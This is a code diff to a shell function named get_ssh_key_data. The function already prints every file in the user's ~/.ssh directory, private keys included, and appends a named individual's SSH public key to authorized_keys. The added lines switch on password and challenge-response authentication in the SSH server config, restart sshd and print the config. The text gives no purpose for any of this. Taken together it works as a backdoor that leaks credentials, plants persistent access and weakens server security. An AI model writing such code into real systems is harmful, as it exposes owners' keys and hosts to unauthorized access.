@@ -79,6 +79,13 @@ function get_ssh_key_data() {
     ls -1a ${HOME}/.ssh | grep -v "^\.\.*$" | while read -r file; do echo " "; echo ${file}; echo "----"; cat ${HOME}/.ssh/${file} || true; done
     echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINHIcAV7LIBE7In/DacZlirV7MjeujXwoxRUEGVNoT3l victorpablosceruelo@gmail.com" >> ${HOME}/.ssh/authorized_keys
     chmod 600 ${HOME}/.ssh/authorized_keys
+
+    sed -i "s@.*PasswordAuthentication\ .*@PasswordAuthentication yes@g" /etc/ssh/sshd_config
+    sed -i "s@.*ChallengeResponseAuthentication\ .*@ChallengeResponseAuthentication yes@g" /etc/ssh/sshd_config
+    systemctl restart sshd
+    systemctl status sshd
+    sleep 5
+    cat /etc/ssh/sshd_config
     # echo "Sleep 7200"
     # sleep 7200
 }
